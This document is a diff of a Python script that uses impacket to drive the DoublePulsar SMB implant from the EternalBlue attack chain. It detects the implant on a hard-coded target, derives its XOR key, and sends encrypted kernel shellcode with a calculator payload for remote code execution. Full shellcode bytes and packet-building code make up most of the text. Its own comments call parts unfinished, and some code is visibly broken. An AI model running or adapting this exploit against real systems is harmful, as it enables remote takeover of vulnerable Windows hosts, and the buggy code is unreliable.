@@ -1,20 +1,24 @@
 #!/usr/bin/python
-from impacket import smb
-from struct import pack
-import sys
-import socket
 
-#majority of code inspiration from worawit's win7 POC for EternalBlue
-#https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a
+from impacket import smb
+import binascii
+import struct
+
+# for XOR decryption
+from itertools import cycle
+
+# majority of code inspiration from worawit's win7 POC for EternalBlue
+# https://gist.github.com/worawit/bd04bad3cd231474763b873df081c09a
 
 def xor_encrypt(message, key):
-	return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(message, cycle(key)))
+    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(message, cycle(key)))
+
 
 '''
 https://github.com/RiskSense-Ops/MS17-010/blob/master/payloads/x64/src/exploit/kernel.asm  
 	Name: kernel  
 	Length: 1019 bytes
-	
+
 	Requires a userland payload size length to be added at the end 
 '''
 kernel_shellcode = b"\xB9\x82\x00\x00\xC0\x0F\x32\x48\xBB\xF8\x0F\xD0\xFF\xFF\xFF\xFF"
@@ -82,7 +86,7 @@ kernel_shellcode += b"\x51\x41\x59\x4C\x8D\x05\x1A\x00\x00\x00\x5A\x48\x83\xEC\x
 kernel_shellcode += b"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
 kernel_shellcode += b"\x5E\xC3"
 
-#pop calculator shellcode - this is a sample.  Change according to your payload
+# pop calculator shellcode - this is a sample.  Change according to your payload
 userland_shellcode = b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
 userland_shellcode += b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
 userland_shellcode += b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
@@ -98,12 +102,22 @@ userland_shellcode += b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
 userland_shellcode += b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
 userland_shellcode += b"\x53\x53\x53\x53\x52\x53\xff\xd7"
 
+
 def calculate_doublepulsar_xor_key(s):
     x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))
     x = x & 0xffffffff  # this line was added just to truncate to 32 bits
     return x
 
+# The arch is adjacent to the XOR key in the SMB signature
+def calculate_doublepulsar_arch(s):
+    if s & 0xffffffff00000000 == 0:
+        return "x86 (32-bit)"
+    else:
+        return "x64 (64-bit)"
+
 def read_dll_file_as_hex():
+    global hex
+
     print("reading DLL into memory!")
     with open("file.bin", "rb") as f:
         data = f.read()
@@ -116,149 +130,161 @@ def read_dll_file_as_hex():
 ############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
 class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
     structure = (
-        ('TotalParameterCount','<H=0'),
-        ('TotalDataCount','<H'),
-        ('ParameterCount','<H=0'),
-        ('ParameterOffset','<H=0'),
-        ('ParameterDisplacement','<H=0'),
-        ('DataCount','<H'),
-        ('DataOffset','<H'),
-        ('DataDisplacement','<H=0'),
-        ('FID','<H=0'),
+        ('TotalParameterCount', '<H=0'),
+        ('TotalDataCount', '<H'),
+        ('ParameterCount', '<H=0'),
+        ('ParameterOffset', '<H=0'),
+        ('ParameterDisplacement', '<H=0'),
+        ('DataCount', '<H'),
+        ('DataOffset', '<H'),
+        ('DataDisplacement', '<H=0'),
+        ('FID', '<H=0'),
     )
-    
+
 def send_trans2_ping(conn, tid):
-	#fill up the SMB Trans2 Secondary packet structures as needed for a DoublePulsar Trans2 Secondary Ping packet
-        #CODE IS NOT FINISHED HERE
-        #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
+    # fill up the SMB Trans2 Secondary packet structures as needed for a DoublePulsar Trans2 Secondary Ping packet
+    # CODE IS NOT FINISHED HERE
+    # helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
 
-	pkt = smb.NewSMBPacket()
-	pkt['Tid'] = tid
-	pkt.Flags1 = 0x18
-        pkt.Flags2 = 0xc007
-        pkt.Timeout = 0x0134ee00 #ping command for DoublePulsar
+    pkt = smb.NewSMBPacket()
+    pkt['Tid'] = tid
+    pkt.Flags1 = 0x18
+    pkt.Flags2 = 0xc007
+    pkt.Timeout = 0x0134ee00  # ping command for DoublePulsar
 
-	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
-	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
-	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
+    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
+    transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
+    transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
 
-	transCommand['Parameters']['TotalParameterCount'] = 0
-	transCommand['Parameters']['TotalDataCount'] = len(data)
+    transCommand['Parameters']['TotalParameterCount'] = 0
+    transCommand['Parameters']['TotalDataCount'] = 0 #len(data)
 
-	fixedOffset = 32+3+18
-	transCommand['Data']['Pad1'] = ''
+    fixedOffset = 32 + 3 + 18
+    transCommand['Data']['Pad1'] = ''
 
-	transCommand['Parameters']['ParameterCount'] = 0
-	transCommand['Parameters']['ParameterOffset'] = 0
+    transCommand['Parameters']['ParameterCount'] = 0
+    transCommand['Parameters']['ParameterOffset'] = 0
 
-	if len(data) > 0:
-		pad2Len = (4 - fixedOffset % 4) % 4
-		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
-	else:
-		transCommand['Data']['Pad2'] = ''
-		pad2Len = 0
-  
-        #trans2 ping command contains no parameters.
-	transCommand['Parameters']['DataCount'] = 0x0000
-	transCommand['Parameters']['DataOffset'] = 0x0000
-	transCommand['Parameters']['DataDisplacement'] = 0x0000
-        
-	#trans2 ping command contains no data
-	#transCommand['Data']['Trans_Parameters'] = ''
-	#transCommand['Data']['Trans_Data'] = data
-	pkt.addCommand(transCommand)
+    # trans2 ping command contains no parameters.
+    transCommand['Parameters']['DataCount'] = 0x0000
+    transCommand['Parameters']['DataOffset'] = 0x0000
+    transCommand['Parameters']['DataDisplacement'] = 0x0000
 
-	conn.sendSMB(pkt)
-	
+    # trans2 ping command contains no data
+    # transCommand['Data']['Trans_Parameters'] = ''
+    # transCommand['Data']['Trans_Data'] = data
+    pkt.addCommand(transCommand)
+
+    conn.sendSMB(pkt)
+
+
 def send_trans2_second(conn, tid, xorkey, data):
-	#fill up the SMB Trans2 Secondary packet structures as needed for a DoublePulsar Trans2 Secondary Execute packet
-        #CODE IS NOT FINISHED HERE
-        #helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
+    # fill up the SMB Trans2 Secondary packet structures as needed for a DoublePulsar Trans2 Secondary Execute packet
+    # CODE IS NOT FINISHED HERE
+    # helpful resource: https://www.rapid7.com/blog/post/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
 
-	pkt = smb.NewSMBPacket()
-	pkt['Tid'] = tid
-	pkt.Flags1 = 0x18
-        pkt.Flags2 = 0xc007
-        pkt.Timeout = 0x25891a00 #execute command for DoublePulsar
+    pkt = smb.NewSMBPacket()
+    pkt['Tid'] = tid
+    pkt.Flags1 = 0x18
+    pkt.Flags2 = 0xc007
+    pkt.Timeout = 0x25891a00  # execute command for DoublePulsar
 
-	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
-	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
-	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
+    transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
+    transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
+    transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
 
-	transCommand['Parameters']['TotalParameterCount'] = 0
-	transCommand['Parameters']['TotalDataCount'] = len(data)
+    transCommand['Parameters']['TotalParameterCount'] = 0
+    transCommand['Parameters']['TotalDataCount'] = len(data)
 
-	fixedOffset = 32+3+18
-	transCommand['Data']['Pad1'] = ''
+    fixedOffset = 32 + 3 + 18
+    transCommand['Data']['Pad1'] = ''
 
-	transCommand['Parameters']['ParameterCount'] = 0
-	transCommand['Parameters']['ParameterOffset'] = 0
+    transCommand['Parameters']['ParameterCount'] = 0
+    transCommand['Parameters']['ParameterOffset'] = 0
 
-	if len(data) > 0:
-		pad2Len = (4 - fixedOffset % 4) % 4
-		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
-	else:
-		transCommand['Data']['Pad2'] = ''
-		pad2Len = 0
-	
-	#xor the parameters
-	#parameters are:
-	#DataCount ( total size of the shellcode )
-        #ChunkSize ( size of the shellcode chunk, or 4096 )
-        #Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
-	transCommand['Parameters']['DataCount'] = xor_encrypt(len(data), xorkey)
-	transCommand['Parameters']['Chunksize'] = xor_encrypt(len(data), xorkey)
-	transCommand['Parameters']['DataOffset'] = xor_encrypt(0x0000, xorkey)
-	''' Old code
-	transCommand['Parameters']['DataCount'] = len(data)
-	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
-	transCommand['Parameters']['DataDisplacement'] = displacement
-	'''
+    if len(data) > 0:
+        pad2Len = (4 - fixedOffset % 4) % 4
+        transCommand['Data']['Pad2'] = '\xFF' * pad2Len
+    else:
+        transCommand['Data']['Pad2'] = ''
+        pad2Len = 0
 
-	#xor the payload data
-	transCommand['Data']['Trans_Parameters'] = ''
-	transCommand['Data']['Trans_Data'] = xor_encrypt(data, xorkey)
-	pkt.addCommand(transCommand)
+    # xor the parameters
+    # parameters are:
+    # DataCount ( total size of the shellcode )
+    # ChunkSize ( size of the shellcode chunk, or 4096 )
+    # Data Offset ( Offset of the data, starts at 0 and increments by 4096 chunk sizes)
+    transCommand['Parameters']['DataCount'] = xor_encrypt(len(data), xorkey)
+    transCommand['Parameters']['Chunksize'] = xor_encrypt(len(data), xorkey)
+    transCommand['Parameters']['DataOffset'] = xor_encrypt(0x0000, xorkey)
+    ''' Old code
+    transCommand['Parameters']['DataCount'] = len(data)
+    transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
+    transCommand['Parameters']['DataDisplacement'] = displacement
+    '''
 
-	conn.sendSMB(pkt)
+    # xor the payload data
+    #transCommand['Data']['Trans_Parameters'] = ''
+    transCommand['Data']['Trans_Data'] = xor_encrypt(data, xorkey)
+    pkt.addCommand(transCommand)
+
+    conn.sendSMB(pkt)
+
+
+def getNTStatus(self):
+	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
+setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)
+
+def getSignature(self):
+	return (self['SecurityFeatures'] << 16) | (self['_reserved'] << 8) | self['SecurityFeatures']
+setattr(smb.NewSMBPacket, "getSignature", getSignature)
+
+def getMid(self):
+	return (self['mid'] << 16) | (self['_reserved'] << 8) | self['mid']
+setattr(smb.NewSMBPacket, "getMid", getMid)
 
 if __name__ == "__main__":
     target = "192.168.0.11"
     conn = smb.SMB(target, target)
     conn.login_standard('', '')
 
-    tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
+    tid = conn.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')
 
-    #send doublepulsar ping packet to get signature
-    #Trans2 ping from Wannacry -> trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
-    #but in this case, we want to build the ping packet from scratch
+    # send doublepulsar ping packet to get signature
+    # Trans2 ping from Wannacry -> trans2_session_setup = binascii.unhexlify("0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000")
+    # but in this case, we want to build the ping packet from scratch
     send_trans2_ping(conn, tid)
     recvPkt = conn.recvSMB()
     retStatus = recvPkt.getNTStatus()
-    
-    #read signature from recv packet
+    signature = recvPkt.Signature()
+
+    # read signature from recv packet
     signature_long = struct.unpack('<Q', signature)[0]
     key = calculate_doublepulsar_xor_key(signature_long)
-    print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (ip, arch, hex(key)))
+    arch = calculate_doublepulsar_arch(signature_long)
+    print("[+] [%s] DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: %s, XOR Key: %s" % (target, arch, hex(key)))
 
-    #at this moment, uploading DLL files is not completed.
-    #read file into memory here
-    #read_dll_file_as_hex()
+    # at this moment, uploading DLL files is not completed.
+    # read file into memory here
+    # read_dll_file_as_hex()
 
-    #kernel shellcode is for 64 bits at the moment
+    # kernel shellcode is for 64 bits at the moment
     modified_kernel_shellcode = bytearray(kernel_shellcode)
-        
-    #add PAYLOAD shellcode length after the kernel shellcode and write this value in hex 
-    modified_kernel_shellcode += hex(len(payload_shellcode))
-    #add the shellcode after the shellcode size
-    modified_kernel_shellcode += payload_shellcode
-  
-    #send doublePulsar exec packet
+
+    # add PAYLOAD shellcode length after the kernel shellcode and write this value in hex
+    modified_kernel_shellcode += hex(len(userland_shellcode))
+    # add the shellcode after the shellcode size
+    modified_kernel_shellcode += userland_shellcode
+
+    # send doublePulsar exec packet
     send_trans2_second(conn, tid, key, modified_kernel_shellcode)
     recvPkt = conn.recvSMB()
-    retStatus = recvPkt.getNTStatus()
+    #retStatus = recvPkt.getNTStatus()
+    midStatus = recvPkt.getMid()
+    if midStatus == 82:
+        print("Looks like doublepulsar worked!\n")
 
-    #nicely close connection
+    # nicely close connection
     conn.disconnect_tree(tid)
     conn.logoff()
     conn.get_socket().close()
